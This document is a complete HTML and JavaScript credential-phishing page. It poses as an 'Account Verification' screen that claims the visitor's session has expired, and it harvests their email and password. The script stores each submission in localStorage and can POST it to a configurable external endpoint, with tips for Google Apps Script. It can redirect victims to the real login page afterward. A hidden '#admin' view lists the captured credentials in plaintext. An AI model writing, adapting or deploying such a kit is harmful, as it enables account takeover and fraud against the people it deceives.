<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Account Verification</title>
<style>
  :root{--brand:#1a56db}
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;display:grid;place-items:center;background:#f3f4f6;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
  .card{background:#fff;padding:40px 32px;border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,.08);width:min(400px,92vw)}
  .logo{width:52px;height:52px;border-radius:12px;background:var(--brand);color:#fff;display:grid;place-items:center;font-weight:700;font-size:22px;margin-bottom:20px}
  h1{font-size:21px;margin:0 0 6px}
  p.sub{color:#6b7280;font-size:14px;margin:0 0 24px}
  label{display:block;font-size:13px;font-weight:600;margin:14px 0 6px;color:#374151}
  input{width:100%;padding:11px 12px;border:1px solid #d1d5db;border-radius:8px;font-size:15px;outline:none}
  input:focus{border-color:var(--brand);box-shadow:0 0 0 3px rgba(26,86,219,.15)}
  button{width:100%;margin-top:22px;padding:12px;background:var(--brand);color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
  button:hover{filter:brightness(1.07)}
  .foot{margin-top:18px;font-size:12px;color:#9ca3af;text-align:center}
  #done{display:none;text-align:center}
  #done .tick{width:56px;height:56px;border-radius:50%;background:#dcfce7;color:#16a34a;display:grid;place-items:center;font-size:28px;margin:0 auto 16px}
  table{width:100%;border-collapse:collapse;font-size:13px}
  th,td{padding:8px;border-bottom:1px solid #e5e7eb;text-align:left;word-break:break-all}
  th{color:#6b7280;font-weight:600}
  #admin{display:none;width:min(900px,95vw);background:#fff;padding:24px;border-radius:14px}
</style>
</head>
<body>

<!-- LOGIN VIEW -->
<div class="card" id="login">
  <div class="logo">A</div>
  <h1>Verify your account</h1>
  <p class="sub">Your session has expired. Sign in again to continue.</p>
  <form id="f">
    <label for="e">Email address</label>
    <input id="e" name="email" type="email" autocomplete="username" required>
    <label for="p">Password</label>
    <input id="p" name="password" type="password" autocomplete="current-password" required>
    <button type="submit">Continue</button>
  </form>
  <p class="foot">Protected by your organization's security policy</p>
</div>

<!-- SUCCESS VIEW -->
<div class="card" id="done">
  <div class="tick">&#10003;</div>
  <h1>Verified</h1>
  <p class="sub" id="doneMsg">Your account has been verified. You can close this tab.</p>
</div>

<!-- ADMIN VIEW (open with yoursite.com/#admin) -->
<div id="admin">
  <h2 style="margin-top:0">Captured submissions <small id="count" style="color:#6b7280;font-weight:400"></small></h2>
  <table><thead><tr><th>Time</th><th>Email</th><th>Password</th><th>UA</th></tr></thead><tbody id="rows"></tbody></table>
  <button id="clear" style="width:auto;padding:8px 14px;background:#ef4444;margin-top:16px">Clear</button>
</div>

<script>
/* ===== CONFIG ===== */
const CONFIG = {
  // POST each submission here. Leave "" to only use localStorage.
  // Google Apps Script Web App URL, Formspree, or your own API:
  endpoint: "",
  redirectUrl: "",            // e.g. "https://real-login.example.com" — "" stays on page
  localOnly: false,           // true = don't POST even if endpoint is set
  doneMessage: "Your account has been verified. You can close this tab."
};

const KEY = "caps";

function store(rec){
  const all = JSON.parse(localStorage.getItem(KEY) || "[]");
  all.push(rec);
  localStorage.setItem(KEY, JSON.stringify(all));
}

document.getElementById("f").addEventListener("submit", async (ev) => {
  ev.preventDefault();
  const email = document.getElementById("e").value.trim();
  const password = document.getElementById("p").value;

  const payload = {
    email, password,
    ts: new Date().toISOString(),
    ua: navigator.userAgent,
    ref: document.referrer || "direct",
    page: location.href
  };

  store(payload);

  if (CONFIG.endpoint && !CONFIG.localOnly) {
    try {
      await fetch(CONFIG.endpoint, {
        method: "POST",
        // use "text/plain" to avoid CORS preflight on Apps Script
        headers: {"Content-Type": "text/plain;charset=utf-8"},
        body: JSON.stringify(payload)
      });
    } catch (err) { /* keep going — data is already in localStorage */ }
  }

  if (CONFIG.redirectUrl) { location.href = CONFIG.redirectUrl; return; }

  document.getElementById("login").style.display = "none";
  document.getElementById("done").style.display = "block";
  document.getElementById("doneMsg").textContent = CONFIG.doneMessage;
});

/* ===== ADMIN VIEW ===== */
function renderAdmin(){
  const all = JSON.parse(localStorage.getItem(KEY) || "[]").reverse();
  document.getElementById("login").style.display = "none";
  document.getElementById("done").style.display = "none";
  document.getElementById("admin").style.display = "block";
  document.getElementById("count").textContent = all.length ? "(" + all.length + ")" : "";
  document.getElementById("rows").innerHTML = all.map(r =>
    `<tr><td>${new Date(r.ts).toLocaleString()}</td>
         <td>${r.email.replace(/[<>&"]/g, c => ({"<":"&lt;",">":"&gt;","&":"&amp;",'"':"&quot;"}[c]))}</td>
         <td>${r.password}</td>
         <td style="max-width:220px">${(r.ua||"").slice(0,70)}</td></tr>`).join("");
}
if (location.hash === "#admin") renderAdmin();
window.addEventListener("hashchange", () => location.hash === "#admin" ? renderAdmin() : location.reload());
document.getElementById("clear").addEventListener("click", () => {
  localStorage.removeItem(KEY); renderAdmin();
});
</script>
</body>
</html>
